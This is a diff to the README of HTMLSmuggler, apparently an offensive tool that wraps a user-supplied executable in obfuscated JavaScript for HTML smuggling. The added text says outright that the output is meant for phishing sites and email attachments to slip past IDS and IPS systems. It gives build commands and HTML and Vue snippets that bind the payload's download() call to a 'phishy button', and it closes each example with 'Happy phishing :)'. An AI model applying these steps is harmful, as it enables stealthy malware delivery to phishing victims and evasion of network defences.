@@ -6,6 +6,8 @@ HTMLSmuggler - JS payload generator for IDS bypass and payload delivery via HTML
 
 The primary objective of HTML smuggling is to bypass network security controls, such as firewalls and intrusion detection systems, by disguising malicious payloads within seemingly harmless HTML and JavaScript code. By exploiting the dynamic nature of web applications, attackers can deliver malicious content to a user's browser without triggering security alerts or being detected by traditional security mechanisms. Thanks to this technique, the download of a malicious file is not displayed in any way in modern IDS solutions.
 
+The main goal of HTMLSmuggler tool is creating an independent javascript library with embedded malicious user-defined payload. This library may be integrated into your phishing sites/email html attachments/etc. to bypass IDS and IPS system and deliver embedded payload to the target user system. An example of created javascript library may be found [here](examples/html/payload.umd.js).
+
 ## Features
 
 * Built-in highly configurable JavaScript obfuscator that fully hides your payload.
@@ -21,25 +23,83 @@ The primary objective of HTML smuggling is to bypass network security controls, 
     yarn
     ```
 
-3. Modify [javascript-obfuscator options](https://github.com/javascript-obfuscator/javascript-obfuscator#javascript-obfuscator-options) in `obfuscator.js`, default preset is nice, but very slow.
-4. Compile your JS payload:
+3. Read help message.
 
     ```bash
-    yarn build -p /path/ot/payload -n file.exe -t "application/octet-stream" -c
+    yarn build -h
     ```
 
-5. Get your payload from `dist/index.js`, insert it into your page and call `download()` function.
+    ```text
+    Options:
+      -p, --payload <string>  Path to payload file you want to smuggle
+      -n, --name <string>     Name of file, that would be downloaded
+      -c, --compress          Enable payload compression (gzip)
+      -t, --type <string>     Contet-Type of downlonaded file (default: "application/octet-stream")
+      -h, --help              Display help for command
+    ```
 
 ## Usage
 
-```text
-Options:
-  -p, --payload <string>  Path to payload file you want to smuggle
-  -n, --name <string>     Name of file, that would be downloaded
-  -c, --compress          Enable payload compression (gzip)
-  -t, --type <string>     Contet-Type of downlonaded file (default: "application/octet-stream")
-  -h, --help              Display help for command
-```
+### Preparation steps
+
+1. Modify (or use my) [javascript-obfuscator options](https://github.com/javascript-obfuscator/javascript-obfuscator#javascript-obfuscator-options) in `obfuscator.js`, my preset is nice, but very slow.
+2. Compile your javascript payload:
+
+    ```bash
+    yarn build -p /path/to/payload -n file.exe -t "application/octet-stream" -c
+    ```
+
+3. Get your payload from `dist/payload.esm.js` or `dist/payload.umd.js`. After that, it may be inserted into your page and called with `download()` function.
+
+> `payload.esm.js` is used in `import { download } from 'payload.esm';` imports (ECMAScript standart).
+>
+> `payload.umd.js` is used in html script SRC and `require('payload.umd');` imports (CommonJS, AMD and pure html).
+
+### Pure HTML example
+
+A full example may be found [here](examples/html/).
+
+1. Do [preparation steps](#preparation-steps).
+2. Import created script to html file (or insert it inline):
+
+    ```html
+    <head>
+      <script src="payload.umd.js"></script>
+    </head>
+    ```
+
+3. Call `download()` function from body:
+
+    ```html
+    <body>
+      <button onclick="download()">Some phishy button</button>
+    </body>
+    ```
+
+4. Happy phishing :)
+
+### VueJS example
+
+A full example may be found [here](examples/vuejs/).
+
+1. Do [preparation steps](#preparation-steps).
+2. Import created script to vue file:
+
+    ```vue
+    <script>
+      import { download } from './payload.esm';
+    </script>
+    ```
+
+3. Call `download()` function:
+
+    ```vue
+    <template>
+      <button @click="download()">Some phishy button</button>
+    </template>
+    ```
+
+4. Happy phishing :)
 
 ## FAQ
 
